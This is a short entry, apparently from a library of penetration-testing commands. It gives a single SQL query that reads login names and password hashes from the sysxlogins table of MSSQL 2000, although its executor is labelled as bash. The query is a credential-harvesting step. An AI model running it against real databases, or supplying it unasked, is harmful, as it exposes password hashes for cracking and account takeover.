---
id: a3ac7dd5-b5de-4b34-8c81-e0b1c0e1a8fb
name: Retrieve name and password hash from sysxlogins table in MSSQL 2000
type: command
executor: bash
data: SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
output: null
created_at: '2023-04-06T03:56:33.738091+00:00'
updated_at: '2023-04-10T20:22:43.467446+00:00'
---

# Retrieve name and password hash from sysxlogins table in MSSQL 2000

```bash
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
```


